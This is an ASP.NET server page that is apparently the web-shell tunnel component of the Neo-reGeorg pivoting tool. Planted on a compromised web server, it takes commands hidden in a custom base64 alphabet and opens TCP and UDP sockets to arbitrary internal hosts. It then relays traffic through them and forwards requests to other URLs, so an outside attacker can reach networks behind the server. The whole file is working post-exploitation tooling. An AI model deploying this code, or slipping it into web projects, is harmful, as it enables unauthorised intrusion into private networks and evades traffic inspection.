<%@ Page Language="C#" EnableSessionState="True"%>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Collections" %>
<script runat="server">
    public String StrTr(string input, string frm, string to) {
        String r = "";
        for(int i=0; i< input.Length; i++) {
            int index = frm.IndexOf(input[i]);
            if(index != -1)
                r += to[index];
            else
                r += input[i];
        }
        return r;
    }

    public static Object[] blv_decode(byte[] data) {
        Object[] info = new Object[40];

        int i = 0;
        int data_len = data.Length;
        int b;
        byte[] length = new byte[4];

        MemoryStream dataInput = new MemoryStream(data);

        while ( i < data_len ) {
            b = dataInput.ReadByte();
            dataInput.Read(length, 0, length.Length);
            int l = bytesToInt(length) - BLV_L_OFFSET;
            byte[] v = new byte[l];
            dataInput.Read(v, 0, v.Length);
            i += ( 5 + l );
            if ( b > 1 && b <= BLVHEAD_LEN ) {
                info[b] = Encoding.Default.GetString(v);
            } else {
                info[b] = v;
            }
        }

        return info;
    }

    public static byte[] blv_encode(Object[] info) {
        Random r = new Random();
        info[0]  = randBytes(r, 5, 20);
        info[39] = randBytes(r, 5, 20);
        MemoryStream buf = new MemoryStream();
        for (int b = 0; b < info.Length; b++) {
            if ( info[b] != null ) {
                Object o = info[b];
                byte[] v;
                if ( o is String ){
                    v = Encoding.Default.GetBytes( (String) o );
                } else {
                    v = (byte[]) o;
                }
                buf.WriteByte((byte) b);
                try {
                    byte[] l = intToBytes(v.Length + BLV_L_OFFSET);
                    buf.Write(l, 0, l.Length);
                    buf.Write(v, 0, v.Length);
                }catch(Exception e) {
                }
            }
        }
        return buf.ToArray();
    }

    public static byte[] randBytes(Random r, int min, int max) {
        int len = r.Next(min, max);
        byte[] randbytes = new byte[len];
        r.NextBytes(randbytes);
        return randbytes;
    }

    public static int bytesToInt(byte[] bytes) {
        int i;
        i =   (  bytes[3] & 0xff )
            | (( bytes[2] & 0xff ) << 8 )
            | (( bytes[1] & 0xff ) << 16)
            | (( bytes[0] & 0xff ) << 24);
        return i;
    }

    public static byte[] intToBytes(int value) {
        byte[] src = new byte[4];
        src[3] = (byte) (value & 0xFF);
        src[2] = (byte) ((value >> 8) & 0xFF);
        src[1] = (byte) ((value >> 16) & 0xFF);
        src[0] = (byte) ((value >> 24) & 0xFF);
        return src;
    }
</script>
<%
    int DATA          = 1;
    int CMD           = 2;
    int MARK          = 3;
    int STATUS        = 4;
    int ERROR         = 5;
    int IP            = 6;
    int PORT          = 7;
    int REDIRECTURL   = 8;
    int FORCEREDIRECT = 9;
    
    String GeorgHello = "NeoGeorg says, 'All seems fine'";

    Object[] info  = new Object[40];
    Object[] rinfo = new Object[40];

    String en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    String de = "BASE64 CHARSLIST";

    String requestDataHead = "";
    String requestDataTail = "";
    
    if (Request.ContentLength != -1) {
        byte[] buff = new byte[Request.ContentLength];
        Request.InputStream.Read(buff, 0, buff.Length);
        String inputData = Encoding.Default.GetString(buff);
        if (USE_REQUEST_TEMPLATE == 1 && inputData.Length > 0) {
            requestDataHead = inputData.Substring(0, START_INDEX);
            requestDataTail = inputData.Substring(inputData.Length - END_INDEX, END_INDEX);

            inputData = inputData.Substring(START_INDEX);
            inputData = inputData.Substring(0, inputData.Length - END_INDEX);
        }
        string b64 = StrTr(inputData, de, en);
        byte[] data = Convert.FromBase64String(b64);
        info = blv_decode(data);
    }

    String rUrl = (String) info[REDIRECTURL];        
    if (rUrl != null){
        Uri u = new Uri(rUrl);
        WebRequest request = WebRequest.Create(u);
        request.Method = Request.HttpMethod;
        foreach (string key in Request.Headers)
        {
            try{
                request.Headers.Add(key, Request.Headers.Get(key));
            } catch (Exception e){}
        }

    try{
        Stream body = request.GetRequestStream();
        info[REDIRECTURL] = null;
        byte[] data = Encoding.Default.GetBytes( requestDataHead + StrTr(Convert.ToBase64String(blv_encode(info)), en, de) + requestDataTail );
        body.Write(data, 0, data.Length);
        body.Close();
    } catch (Exception e){}

    HttpWebResponse response = (HttpWebResponse)request.GetResponse();
    WebHeaderCollection webHeader = response.Headers;
    for (int i=0;i < webHeader.Count; i++)
    {
        string rkey = webHeader.GetKey(i);
        if (rkey != "Content-Length" && rkey != "Transfer-Encoding")
            Response.AddHeader(rkey, webHeader[i]);
    }

    StreamReader repBody = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding("UTF-8"));
    string rbody = repBody.ReadToEnd();
    Response.AddHeader("Content-Length", rbody.Length.ToString());
    Response.Write(rbody);
    return;
}

Response.StatusCode = HTTPCODE;
String cmd = (String) info[CMD];
if (cmd != null) {
    String mark = (String) info[MARK];
    if (cmd == "CONNECT") {
        try {
            String target = (String) info[IP];
            int port = int.Parse((String) info[PORT]);
            IPAddress ip;
            try {
                ip = IPAddress.Parse(target);
            } catch (Exception ex) {
                IPHostEntry host = Dns.GetHostByName(target);
                ip = host.AddressList[0];
            }
            System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, port);
            Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            // set the connect timeout to 2 seconds, default 20 seconds
            IAsyncResult result = sender.BeginConnect(remoteEP,null,null);
            bool success = result.AsyncWaitHandle.WaitOne( 2000, true );

            if ( sender.Connected ) {
                sender.Blocking = false;
                Application.Add(mark, sender);
                rinfo[STATUS] = "OK";
            } else {
                sender.Close();
                rinfo[STATUS] = "FAIL";
                if ( success ) {
                    rinfo[ERROR] = "Port close";
                } else {
                    rinfo[ERROR] = "Port filtered";
                }
            }
        } catch (Exception ex) {
            rinfo[STATUS] = "FAIL";
            rinfo[ERROR] = ex.Message;
        }
    } else if (cmd == "UDP") {
        try {
            String target = (String) info[IP];
            int port = int.Parse((String) info[PORT]);
            IPAddress ip;
            try {
                ip = IPAddress.Parse(target);
            } catch (Exception ex) {
                IPHostEntry host = Dns.GetHostByName(target);
                ip = host.AddressList[0];
            }
            System.Net.IPEndPoint localEP = new IPEndPoint(ip, port);
            Socket relay = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

            try {
                relay.Bind(localEP);
                relay.Blocking = false;
                Application.Add(mark, relay);
                rinfo[STATUS] = "OK";
                rinfo[DATA] = ((IPEndPoint)relay.LocalEndPoint).Address.ToString() + ":" + ((IPEndPoint)relay.LocalEndPoint).Port.ToString();
            } catch (Exception ex) {
                rinfo[STATUS] = "FAIL";
                rinfo[ERROR] = ex.Message;
            }
        } catch (Exception ex) {
            rinfo[STATUS] = "FAIL";
            rinfo[ERROR] = ex.Message;
        }
    } else if (cmd == "DISCONNECT") {
        try {
            Socket s = (Socket)Application[mark];
            s.Close();
        } catch (Exception ex){
        }
        Application.Remove(mark);
    } else if (cmd == "FORWARD") {
        Socket s = (Socket)Application[mark];
        if (s.ProtocolType == ProtocolType.Tcp) {
            try {
                s.Send((byte[]) info[DATA]);
                rinfo[STATUS] = "OK";
            } catch (Exception ex) {
                rinfo[STATUS] = "FAIL";
                rinfo[ERROR] = ex.Message;
            }
        }
        else if (s.ProtocolType == ProtocolType.Udp) {
            try {
                String target = (String) info[IP];
                int port = int.Parse((String) info[PORT]);
                IPAddress ip = IPAddress.Parse(target);
                System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, port);
                
                s.SendTo((byte[]) info[DATA], remoteEP);
                rinfo[STATUS] = "OK";
            } catch (Exception ex) {
                rinfo[STATUS] = "FAIL";
                rinfo[ERROR] = ex.Message;
            }
        }
        
    } else if (cmd == "READ") {
        Socket s = (Socket)Application[mark];
        if (s.ProtocolType == ProtocolType.Tcp) {
            try {
                int maxRead = MAXREADSIZE;
                int readbuflen = READBUF;
                int readLen = 0;
                byte[] readBuff = new byte[readbuflen];
                MemoryStream readData = new MemoryStream();
                try {
                    int c = s.Receive(readBuff);
                    while (c > 0) {
                        byte[] newBuff = new byte[c];
                        System.Buffer.BlockCopy(readBuff, 0, newBuff, 0, c);
                        string b64 = Convert.ToBase64String(newBuff);
                        readData.Write(newBuff, 0, c);
                        readLen += c;
                        if (c < readbuflen || readLen >= maxRead)
                            break;
                        c = s.Receive(readBuff);
                    }
                    rinfo[DATA] = readData.ToArray();
                    rinfo[STATUS] = "OK";
                } catch (SocketException ex) {
                    rinfo[STATUS] = "OK";
                }
            } catch (Exception ex) {
                rinfo[STATUS] = "FAIL";
                rinfo[ERROR] = ex.Message;
            }
        } else if (s.ProtocolType == ProtocolType.Udp) {
            try {
                int maxRead = MAXREADSIZE;
                int readbuflen = READBUF;
                int readLen = 0;
                byte[] readBuff = new byte[readbuflen];
                MemoryStream readData = new MemoryStream();
                try {
                    EndPoint remoteEP = (EndPoint) new IPEndPoint(IPAddress.Any, 0);
                    int c = s.ReceiveFrom(readBuff, ref remoteEP);
                    while (c > 0) {
                        byte[] newBuff = new byte[c];
                        System.Buffer.BlockCopy(readBuff, 0, newBuff, 0, c);
                        string b64 = Convert.ToBase64String(newBuff);
                        readData.Write(newBuff, 0, c);
                        readLen += c;
                        if (c < readbuflen || readLen >= maxRead)
                            break;
                        c = s.ReceiveFrom(readBuff, ref remoteEP);
                    }
                    var address = remoteEP.ToString().Split(':');
                    rinfo[IP] = address[0]; 
                    rinfo[PORT] = address[1];
                    rinfo[DATA] = readData.ToArray();
                    rinfo[STATUS] = "OK";
                } catch (SocketException ex) {
                    rinfo[STATUS] = "OK";
                }
            } catch (Exception ex) {
                rinfo[STATUS] = "FAIL";
                rinfo[ERROR] = ex.Message;
            }
        }
    }
    Response.Write(StrTr(Convert.ToBase64String(blv_encode(rinfo)), en, de));
    } else {
        Response.Write(Encoding.Default.GetString(Convert.FromBase64String(StrTr(GeorgHello, de, en))));
    }
%>
